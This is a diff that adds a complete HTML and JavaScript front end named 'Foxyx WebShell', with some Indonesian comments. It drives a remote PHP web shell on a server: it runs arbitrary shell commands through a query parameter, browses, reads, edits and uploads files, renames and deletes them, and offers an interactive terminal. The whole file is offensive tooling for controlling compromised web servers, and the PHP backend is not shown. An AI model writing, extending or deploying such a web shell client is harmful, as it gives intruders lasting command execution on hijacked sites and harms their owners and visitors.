@@ -1,0 +1,822 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <title>Foxyx WebShell</title>
+
+  <!-- Tailwind CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Tailwind config (warna oranye) -->
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            foxOrange: '#ff8c00'
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- Custom scrollbar styling & blink animation -->
+  <style>
+    .sidebar-scroll::-webkit-scrollbar {
+      width: 8px;
+    }
+    .sidebar-scroll::-webkit-scrollbar-thumb {
+      background-color: #666;
+      border-radius: 9999px;
+      border: 2px solid rgba(0,0,0,0);
+      background-clip: padding-box;
+    }
+    .sidebar-scroll::-webkit-scrollbar-track {
+      background-color: #222;
+    }
+    .icon-orange {
+      width: 1.2rem;
+      height: 1.2rem;
+      filter: invert(48%) sepia(94%) saturate(5214%) hue-rotate(0deg) brightness(101%) contrast(105%);
+    }
+    .icon-btn {
+      background: transparent;
+      border: none;
+      padding: 0.25rem;
+      cursor: pointer;
+    }
+
+    /* Blink animation for the title when API not set */
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .blink {
+      animation: blink 1s infinite;
+    }
+  </style>
+</head>
+
+<body class="bg-gray-900 text-gray-100 h-screen w-screen overflow-hidden flex flex-col">
+
+  <!-- HEADER -->
+  <header class="bg-gray-800 backdrop-blur-sm bg-opacity-70 p-4 flex items-center justify-center shadow-md relative">
+    <!-- Title / Domain (blink by default) -->
+    <div id="header-title" class="text-xl font-bold text-foxOrange tracking-wide cursor-pointer blink">
+      Foxyx WebShell
+    </div>
+
+    <!-- Container for input domain + check / X (hidden by default) -->
+    <div 
+      id="header-edit"
+      class="absolute inset-0 flex items-center justify-center space-x-2 hidden"
+    >
+      <input 
+        type="text" 
+        id="header-input" 
+        class="bg-gray-700 text-gray-200 rounded px-2 py-1 w-72 focus:outline-none focus:ring-2 focus:ring-orange-500"
+        placeholder="https://example.com/foxyshell.php"
+      />
+      <!-- Check -->
+      <button id="header-check" class="icon-btn">
+        <img 
+          src="https://www.svgrepo.com/show/525266/check-square.svg" 
+          class="icon-orange"
+        />
+      </button>
+      <!-- X -->
+      <button id="header-cancel" class="icon-btn">
+        <img 
+          src="https://www.svgrepo.com/show/433361/close-f.svg"
+          class="icon-orange"
+        />
+      </button>
+    </div>
+  </header>
+
+  <!-- MAIN CONTAINER -->
+  <div class="flex flex-1 overflow-hidden">
+    <!-- SIDEBAR (width 25rem) -->
+    <aside 
+      class="bg-gray-800/50 backdrop-blur-sm border-r border-gray-700 p-4 overflow-auto sidebar-scroll"
+      style="width: 25rem;"
+    >
+      <h2 class="text-lg font-semibold text-foxOrange mb-3">Files</h2>
+
+      <!-- ROW: REFRESH, UPLOAD, NEW FILE, NEW FOLDER -->
+      <div class="flex flex-wrap items-center gap-2 mb-4">
+        <button 
+          id="refresh-btn"
+          class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition"
+        >
+          ↻
+        </button>
+
+        <button 
+          id="upload-btn"
+          class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition"
+        >
+          Upload
+        </button>
+        <input type="file" id="file-input" class="hidden" />
+
+        <button 
+          id="newfile-btn"
+          class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition"
+        >
+          New File
+        </button>
+
+        <button 
+          id="newfolder-btn"
+          class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition"
+        >
+          New Folder
+        </button>
+      </div>
+
+      <!-- FILE LIST -->
+      <ul id="file-list" class="space-y-1 text-sm"></ul>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <main class="flex-1 overflow-auto p-4">
+
+      <!-- BREADCRUMB PATH -->
+      <nav id="breadcrumb" class="mb-4 flex items-center space-x-2 text-sm text-gray-400"></nav>
+
+      <!-- EDITOR -->
+      <section class="mb-8">
+        <h2 class="text-lg font-semibold text-foxOrange mb-2">Editor</h2>
+        <textarea
+          id="editor"
+          placeholder="File content..."
+          class="w-full p-2 bg-gray-800 text-gray-100 rounded focus:outline-none focus:ring-2 focus:ring-orange-500 resize-vertical"
+          style="height: 30vh;"
+        ></textarea>
+
+        <div class="mt-2">
+          <button 
+            id="save-btn"
+            class="px-3 py-1 bg-foxOrange text-gray-900 font-semibold rounded hover:bg-orange-400 transition"
+          >
+            Save Changes
+          </button>
+        </div>
+        <div 
+          id="edit-status" 
+          class="mt-2 text-sm text-gray-400"
+        ></div>
+      </section>
+
+      <!-- TERMINAL -->
+      <section>
+        <h2 class="text-lg font-semibold text-foxOrange mb-2">Terminal</h2>
+
+        <!-- Slider for height -->
+        <label for="term-height" class="text-sm text-gray-300 flex items-center space-x-2 mb-2">
+          <span>Terminal height:</span>
+          <input 
+            type="range"
+            id="term-height"
+            min="100"
+            max="600"
+            value="300"
+            class="accent-orange-500 w-52"
+          />
+          <span id="term-height-value" class="w-10 text-right">300</span>
+          <span>px</span>
+        </label>
+
+        <!-- Terminal output -->
+        <div
+          id="terminal-output"
+          class="bg-black text-green-400 font-mono overflow-auto rounded p-2 mb-2"
+          style="height: 300px;"
+        ></div>
+
+        <!-- Terminal input -->
+        <div class="bg-black rounded p-1 flex items-center">
+          <span class="text-green-400 mx-1">$</span>
+          <input 
+            type="text"
+            id="term-input"
+            class="flex-1 bg-transparent border-none outline-none text-green-300 text-sm"
+            placeholder="Type command here..."
+          />
+        </div>
+      </section>
+    </main>
+  </div>
+
+<script>
+  // 1) Memuat API dari localStorage (mungkin kosong)
+  var storedURL = localStorage.getItem('foxyxURL');
+  var API = storedURL || ''; // if blank => no requests
+
+  var currentPath = '';
+  var currentFile = '';
+  var newItemMode = null; // 'file'/'folder'
+  var renameModeItem = null;
+
+  var termOutput = null;
+  var termInput = null;
+
+  function init(){
+    termOutput = document.getElementById('terminal-output');
+    termInput  = document.getElementById('term-input');
+    updateHeaderTitle();
+    setupEvents();
+
+    if(API){
+      getPwd();
+    }
+  }
+  init();
+
+  // Mendapatkan PWD (hanya jika API tak kosong)
+  function getPwd(){
+    if(!API) return;
+    fetch(API+'?foxy=pwd')
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        var p=parseResponse(txt);
+        currentPath=p.cwd;
+        refreshList();
+        connectTerminal();
+      })
+      .catch(function(e){
+        console.error(e);
+      });
+  }
+
+  // connectTerminal => ls -a tapi output disembunyikan, hanya "Terminal Connected"
+  function connectTerminal(){
+    if(!API)return;
+    appendTerminalLine('$ ls -a');
+    fetch(API+'?cwd='+encodeURIComponent(currentPath)+'&foxy='+encodeURIComponent('ls -a'))
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        appendTerminalLine('<!-- Terminal Connected -->');
+      })
+      .catch(function(e){
+        appendTerminalLine('Error connectTerminal: '+ e.message);
+      });
+  }
+
+  // parse => { out, cwd }
+  function parseResponse(txt){
+    var parts=txt.split(/\r?\n\r?\n/);
+    var cwd=parts.pop().trim();
+    var out=parts.join('\n\n');
+    return { out:out, cwd:cwd };
+  }
+
+  // refresh => ls -1p
+  function refreshList(){
+    if(!API){
+      alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+      return;
+    }
+    var cmd='ls -1p';
+    fetch(API+'?cwd='+encodeURIComponent(currentPath)+'&foxy='+encodeURIComponent(cmd))
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        var p=parseResponse(txt);
+        currentPath=p.cwd;
+        renderBreadcrumb(currentPath);
+
+        var lines=p.out.trim().split('\n');
+        var ul=document.getElementById('file-list');
+        ul.innerHTML='';
+
+        if(newItemMode){
+          ul.appendChild(createNewItemRow(newItemMode));
+        }
+
+        for(var i=0;i<lines.length;i++){
+          var item=lines[i];
+          if(!item) continue;
+          var isFolder=(item.slice(-1)==='/');
+          var name=isFolder? item.slice(0,-1): item;
+          ul.appendChild(createItemRow(name,isFolder));
+        }
+      })
+      .catch(function(e){
+        console.error(e);
+      });
+  }
+
+  // runCommandSilent => jalankan cmd tanpa menampilkan di terminal
+  function runCommandSilent(cmd){
+    if(!API) return Promise.resolve();
+    var url=API+'?cwd='+encodeURIComponent(currentPath)+'&foxy='+encodeURIComponent(cmd);
+    return fetch(url)
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        var p=parseResponse(txt);
+        currentPath=p.cwd;
+      })
+      .catch(function(e){
+        console.error(e);
+      });
+  }
+
+  // RENDER BREADCRUMB
+  function renderBreadcrumb(path){
+    var bc=document.getElementById('breadcrumb');
+    bc.innerHTML='';
+    if(!path)return;
+    var segs=path.split('/');
+    var parts=[];
+    for(var i=0;i<segs.length;i++){
+      if(i===0 && segs[i]===''){
+        parts.push('/');
+      } else if(segs[i]){
+        parts.push(segs[i]);
+      }
+    }
+
+    var accum='';
+    for(var j=0;j<parts.length;j++){
+      var seg=parts[j];
+      if(j===0 && seg==='/'){
+        accum='/';
+      } else if(accum===''||accum==='/'){
+        accum='/'+seg;
+      } else {
+        accum+='/'+seg;
+      }
+
+      if(j>0){
+        var slash=document.createElement('span');
+        slash.textContent='/';
+        slash.className='text-gray-500';
+        bc.appendChild(slash);
+      }
+      var sp=document.createElement('span');
+      sp.className='cursor-pointer hover:underline';
+      sp.textContent=(seg==='/'?'/':seg);
+      (function(dest){
+        sp.onclick=function(){
+          runCommandSilent('cd '+dest).then(function(){
+            refreshList();
+          });
+        };
+      })(accum);
+      bc.appendChild(sp);
+    }
+  }
+
+  // new item row
+  function createNewItemRow(mode){
+    var li=document.createElement('li');
+    li.className='flex items-center justify-between bg-gray-800/40 rounded px-2 py-1';
+
+    var leftDiv=document.createElement('div');
+    leftDiv.className='flex items-center';
+
+    var icon=document.createElement('img');
+    icon.className='icon-orange mr-2';
+    icon.src=(mode==='folder')
+      ? 'https://www.svgrepo.com/show/436171/close-folder-data.svg'
+      : 'https://www.svgrepo.com/show/436151/file-file-format-folder.svg';
+    leftDiv.appendChild(icon);
+
+    var inp=document.createElement('input');
+    inp.type='text';
+    inp.className='bg-gray-700 text-gray-200 rounded px-2 py-0.5 w-36 focus:outline-none focus:ring-2 focus:ring-orange-500';
+    leftDiv.appendChild(inp);
+
+    li.appendChild(leftDiv);
+
+    var actions=document.createElement('div');
+    actions.className='flex items-center space-x-2 ml-4';
+
+    var btnC=document.createElement('button');
+    btnC.className='icon-btn';
+    var imgC=document.createElement('img');
+    imgC.src='https://www.svgrepo.com/show/525266/check-square.svg';
+    imgC.className='icon-orange';
+    btnC.appendChild(imgC);
+
+    btnC.onclick=function(){
+      var val=inp.value.trim();
+      if(!val)return;
+      if(mode==='folder'){
+        runCommandSilent('mkdir '+val).then(function(){
+          newItemMode=null;
+          refreshList();
+        });
+      } else {
+        runCommandSilent('touch '+val).then(function(){
+          newItemMode=null;
+          refreshList();
+        });
+      }
+    };
+    actions.appendChild(btnC);
+
+    var btnX=document.createElement('button');
+    btnX.className='icon-btn';
+    var imgX2=document.createElement('img');
+    imgX2.src='https://www.svgrepo.com/show/433361/close-f.svg';
+    imgX2.className='icon-orange';
+    btnX.appendChild(imgX2);
+
+    btnX.onclick=function(){
+      newItemMode=null;
+      refreshList();
+    };
+    actions.appendChild(btnX);
+
+    li.appendChild(actions);
+    return li;
+  }
+
+  // createItemRow => normal file/folder
+  var renameModeItem=null;
+  function createItemRow(name,isFolder){
+    var li=document.createElement('li');
+    li.className='flex items-center justify-between bg-gray-800/40 rounded px-2 py-1';
+
+    var leftDiv=document.createElement('div');
+    leftDiv.className='flex items-center';
+
+    var icon=document.createElement('img');
+    icon.className='icon-orange mr-2';
+    icon.src=isFolder
+      ? 'https://www.svgrepo.com/show/436171/close-folder-data.svg'
+      : 'https://www.svgrepo.com/show/436151/file-file-format-folder.svg';
+    leftDiv.appendChild(icon);
+
+    var displayName=name.length>25 ? name.slice(0,25)+'...' : name;
+    var span=document.createElement('span');
+    span.title=name;
+    if(isFolder){
+      span.className='text-foxOrange hover:underline cursor-pointer';
+      span.textContent=displayName;
+      span.onclick=function(){
+        runCommandSilent('cd '+name).then(function(){refreshList();});
+      };
+    } else {
+      span.className='text-gray-200';
+      span.textContent=displayName;
+    }
+    leftDiv.appendChild(span);
+    li.appendChild(leftDiv);
+
+    if(!isFolder){
+      if(renameModeItem===name){
+        // rename mode
+        var actions=document.createElement('div');
+        actions.className='flex items-center space-x-2 ml-4';
+
+        var inpR=document.createElement('input');
+        inpR.type='text';
+        inpR.className='bg-gray-700 text-gray-200 rounded px-2 py-0.5 w-36 focus:outline-none focus:ring-2 focus:ring-orange-500';
+        inpR.value=name;
+        actions.appendChild(inpR);
+
+        var btnCheck=document.createElement('button');
+        btnCheck.className='icon-btn';
+        var imgChk=document.createElement('img');
+        imgChk.src='https://www.svgrepo.com/show/525266/check-square.svg';
+        imgChk.className='icon-orange';
+        btnCheck.appendChild(imgChk);
+
+        btnCheck.onclick=function(){
+          var nv=inpR.value.trim();
+          if(!nv || nv===name){
+            renameModeItem=null;
+            refreshList();
+            return;
+          }
+          renameFile(name,nv);
+        };
+        actions.appendChild(btnCheck);
+
+        var btnX=document.createElement('button');
+        btnX.className='icon-btn';
+        var imgX3=document.createElement('img');
+        imgX3.src='https://www.svgrepo.com/show/433361/close-f.svg';
+        imgX3.className='icon-orange';
+        btnX.appendChild(imgX3);
+
+        btnX.onclick=function(){
+          renameModeItem=null;
+          refreshList();
+        };
+        actions.appendChild(btnX);
+
+        li.appendChild(actions);
+      } else {
+        // normal file
+        var actions2=document.createElement('div');
+        actions2.className='flex items-center space-x-2 ml-4';
+
+        // Edit
+        var btnE=document.createElement('button');
+        btnE.className='icon-btn';
+        var imgE=document.createElement('img');
+        imgE.src='https://www.svgrepo.com/show/436186/edit-tool-pencil.svg';
+        imgE.className='icon-orange';
+        btnE.appendChild(imgE);
+
+        btnE.onclick=(function(fname){
+          return function(){
+            currentFile=fname;
+            loadFile(fname);
+          };
+        })(name);
+        actions2.appendChild(btnE);
+
+        // Delete
+        var btnD=document.createElement('button');
+        btnD.className='icon-btn';
+        var imgD=document.createElement('img');
+        imgD.src='https://www.svgrepo.com/show/436163/delete-trash-remove.svg';
+        imgD.className='icon-orange';
+        btnD.appendChild(imgD);
+
+        btnD.onclick=(function(fname){
+          return function(){
+            deleteFile(fname).then(function(){refreshList();});
+          };
+        })(name);
+        actions2.appendChild(btnD);
+
+        // Rename
+        var btnR=document.createElement('button');
+        btnR.className='icon-btn';
+        var imgR=document.createElement('img');
+        imgR.src='https://www.svgrepo.com/show/436169/pencil-tool-pen.svg';
+        imgR.className='icon-orange';
+        btnR.appendChild(imgR);
+
+        btnR.onclick=(function(fname){
+          return function(){
+            renameModeItem=fname;
+            refreshList();
+          };
+        })(name);
+        actions2.appendChild(btnR);
+
+        li.appendChild(actions2);
+      }
+    }
+    return li;
+  }
+
+  function renameFile(oldN,newN){
+    if(!API) return;
+    var url=API+'?cwd='+encodeURIComponent(currentPath)+'&old='+encodeURIComponent(oldN)
+      +'&new='+encodeURIComponent(newN);
+    fetch(url)
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        console.log('RenameFile:',txt);
+        renameModeItem=null;
+        refreshList();
+      })
+      .catch(function(e){console.error(e);});
+  }
+
+  function deleteFile(name){
+    if(!API) return Promise.resolve();
+    var url=API+'?cwd='+encodeURIComponent(currentPath)+'&file='+encodeURIComponent(name);
+    return fetch(url)
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        console.log('Delete:',txt);
+      })
+      .catch(function(e){console.error(e);});
+  }
+
+  function loadFile(fname){
+    if(!API){
+      alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+      return;
+    }
+    runCommandSilent('cat '+fname).then(function(){
+      var url=API+'?cwd='+encodeURIComponent(currentPath)+'&foxy='+encodeURIComponent('cat '+fname);
+      return fetch(url).then(function(r){return r.text();});
+    }).then(function(txt2){
+      var p=parseResponse(txt2);
+      currentPath=p.cwd;
+      document.getElementById('editor').value=p.out;
+    }).catch(function(e){
+      console.error(e);
+    });
+  }
+
+  // Save => reupload
+  function saveFile(){
+    if(!API){
+      alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+      return;
+    }
+    if(!currentFile){
+      alert('No file selected. Click pencil icon to edit a file first.');
+      return;
+    }
+    var content=document.getElementById('editor').value;
+    var blob=new Blob([content],{type:'text/plain'});
+    var fd=new FormData();
+    fd.append('file',blob,currentFile);
+    fd.append('cwd',currentPath);
+
+    fetch(API,{method:'POST',body:fd})
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        document.getElementById('edit-status').textContent='Update Success: '+currentFile;
+        setTimeout(function(){
+          document.getElementById('edit-status').textContent='';
+        },5000);
+        refreshList();
+      })
+      .catch(function(e){
+        console.error(e);
+      });
+  }
+
+  // TERMINAL
+  function handleTerminalCommand(cmd){
+    if(!API){
+      appendTerminalLine("URL API NOT SET!, Click Foxyx WebShell To SET API");
+      return;
+    }
+    // intercept ls => ls -1, ls -a => ls -a -1
+    if(cmd==='ls'){
+      cmd='ls -1';
+    } else if(cmd==='ls -a'){
+      cmd='ls -a -1';
+    }
+    appendTerminalLine('$ '+cmd);
+
+    fetch(API+'?cwd='+encodeURIComponent(currentPath)+'&foxy='+encodeURIComponent(cmd))
+      .then(function(r){return r.text();})
+      .then(function(txt){
+        var p=parseResponse(txt);
+        currentPath=p.cwd;
+        if(p.out) appendTerminalLine(p.out);
+        refreshList();
+        termOutput.scrollTop=termOutput.scrollHeight;
+      })
+      .catch(function(e){
+        appendTerminalLine('Error: '+e.message);
+      });
+  }
+
+  function appendTerminalLine(text){
+    var div=document.createElement('div');
+    div.className='terminal-line whitespace-pre';
+    div.textContent=text;
+    termOutput.appendChild(div);
+  }
+
+  // Setup event listeners
+  function setupEvents(){
+    var range=document.getElementById('term-height');
+    var rangeVal=document.getElementById('term-height-value');
+    range.addEventListener('input',function(){
+      var px=range.value;
+      document.getElementById('terminal-output').style.height=px+'px';
+      rangeVal.textContent=px;
+    });
+
+    termOutput=document.getElementById('terminal-output');
+    termInput=document.getElementById('term-input');
+    termInput.addEventListener('keydown',function(e){
+      if(e.key==='Enter'){
+        e.preventDefault();
+        var cmd=termInput.value.trim();
+        if(!cmd)return;
+        termInput.value='';
+        handleTerminalCommand(cmd);
+      }
+    });
+
+    // refresh
+    document.getElementById('refresh-btn').addEventListener('click',function(){
+      if(!API){
+        alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+        return;
+      }
+      refreshList();
+    });
+
+    // upload
+    var uplB=document.getElementById('upload-btn');
+    var fileIn=document.getElementById('file-input');
+    uplB.addEventListener('click',function(){
+      if(!API){
+        alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+        return;
+      }
+      fileIn.click();
+    });
+    fileIn.addEventListener('change',function(){
+      if(!API)return;
+      if(!fileIn.files.length)return;
+      var fd=new FormData();
+      fd.append('cwd',currentPath);
+      fd.append('file',fileIn.files[0]);
+      fetch(API,{method:'POST',body:fd})
+        .then(function(r){return r.text();})
+        .then(function(txt){
+          alert(txt);
+          fileIn.value='';
+          refreshList();
+        })
+        .catch(function(e){
+          console.error(e);
+        });
+    });
+
+    // New File
+    document.getElementById('newfile-btn').addEventListener('click',function(){
+      if(!API){
+        alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+        return;
+      }
+      newItemMode='file';
+      refreshList();
+    });
+    // New Folder
+    document.getElementById('newfolder-btn').addEventListener('click',function(){
+      if(!API){
+        alert("URL API NOT SET!, Click Foxyx WebShell To SET API");
+        return;
+      }
+      newItemMode='folder';
+      refreshList();
+    });
+
+    // Save Changes
+    document.getElementById('save-btn').addEventListener('click',function(){
+      saveFile();
+    });
+
+    // Header dynamic url
+    var headTitle=document.getElementById('header-title');
+    var headEdit=document.getElementById('header-edit');
+    var headInput=document.getElementById('header-input');
+    var headCheck=document.getElementById('header-check');
+    var headCancel=document.getElementById('header-cancel');
+
+    headTitle.addEventListener('click',function(){
+      headTitle.classList.add('hidden');
+      headEdit.classList.remove('hidden');
+      headInput.value=API;
+    });
+
+    headCheck.addEventListener('click',function(){
+      var val=headInput.value.trim();
+      if(val){
+        localStorage.setItem('foxyxURL',val);
+        API=val;
+        // Stop blinking
+        headTitle.classList.remove('blink');
+      } else {
+        localStorage.removeItem('foxyxURL');
+        API='';
+        // Keep blinking if empty
+        headTitle.classList.add('blink');
+      }
+      headTitle.classList.remove('hidden');
+      headEdit.classList.add('hidden');
+      updateHeaderTitle();
+      if(API) getPwd();
+    });
+
+    headCancel.addEventListener('click',function(){
+      headTitle.classList.remove('hidden');
+      headEdit.classList.add('hidden');
+    });
+  }
+
+  function updateHeaderTitle(){
+    var t=document.getElementById('header-title');
+    var s=localStorage.getItem('foxyxURL');
+    if(s){
+      // parse domain
+      try {
+        var url=new URL(s);
+        var host=url.host; // domain
+        t.textContent=host || s;
+        // stop blinking
+        t.classList.remove('blink');
+      } catch(e){
+        t.textContent=s;
+        t.classList.remove('blink');
+      }
+    } else {
+      t.textContent='Foxyx WebShell';
+      // start blink
+      t.classList.add('blink');
+    }
+  }
+</script>
+</body>
+</html>
